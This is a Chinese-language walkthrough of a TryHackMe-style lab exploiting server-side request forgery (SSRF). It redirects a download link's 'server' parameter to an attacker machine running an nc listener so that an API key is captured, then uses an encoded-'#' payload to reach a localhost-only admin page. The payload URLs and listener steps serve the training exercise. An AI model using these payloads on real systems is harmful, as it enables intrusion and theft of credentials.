探索目标站点，我们可以发现唯一允许访问admin区域的主机：

![image-20240110000348310](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110000348310.png)

> 唯一允许访问管理区域的主机是：localhost

检查"Download Resume"按钮，查看相关外链的server(服务器)参数指向何处：

![image-20240110000503770](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110000503770.png)

![image-20240110000622528](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110000622528.png)

![image-20240110002257509](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110002257509.png)

> "/download?server=secure-file-storage.com:8087\&id=75482342"
>
> server参数指向的是：secure-file-storage.com

利用SSRF漏洞，使得Web应用程序将请求转发到AttackBox或本地攻击机。

我们刚才找到了一个外部链接`http://10.10.206.41:8087/download?server=secure-file-storage.com:8087&id=75482342`，将其中的server参数的值指向我们的攻击机IP地址即可实现对SSRF漏洞的利用。

![image-20240110000937193](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110000937193.png)

我们先在攻击机终端设置一个netcat端口监听器：

```shell
nc -lvnp 8087
```

![image-20240110001247077](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110001247077.png)

然后再使用浏览器去访问替换了server参数的链接：`http://10.10.206.41:8087/download?server=10.11.15.168:8087&id=75482342`

![image-20240110001801768](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110001801768.png)

然后我们就能在攻击机终端接受到相关的请求消息：

![image-20240110001822974](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110001822974.png)

> 我们所捕获的请求中的API Key内容为：THM{Hello\_Im\_just\_an\_API\_key} 。

![image-20240110001958602](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110001958602.png)

额外练习：尝试利用SSRF漏洞来访问目标站点的admin区域。

从本小节的第一个问题中，我们已经知道唯一允许访问admin区域的主机是localhost，所以我们尝试针对性地修改网站外部链接中的server值：

```
server=http://localhost:8087/admin#&id=75482342

server=http://localhost:8087/admin%23&id=75482342

http://10.10.206.41:8087/download?server=http://localhost:8087/admin%23&id=75482342
```

经过测试，我们发现需要对链接中的#符号进行URL编码处理。

![image-20240110004215714](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110004215714.png)

最终我们将要访问的链接为：http://10.10.206.41:8087/download?server=http://localhost:8087/admin%23\&id=75482342

![image-20240110003133156](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110003133156.png)

如上图所示，我们成功地得到了相关的flag值`thm{c4n_i_haz_flagz_plz?}`。
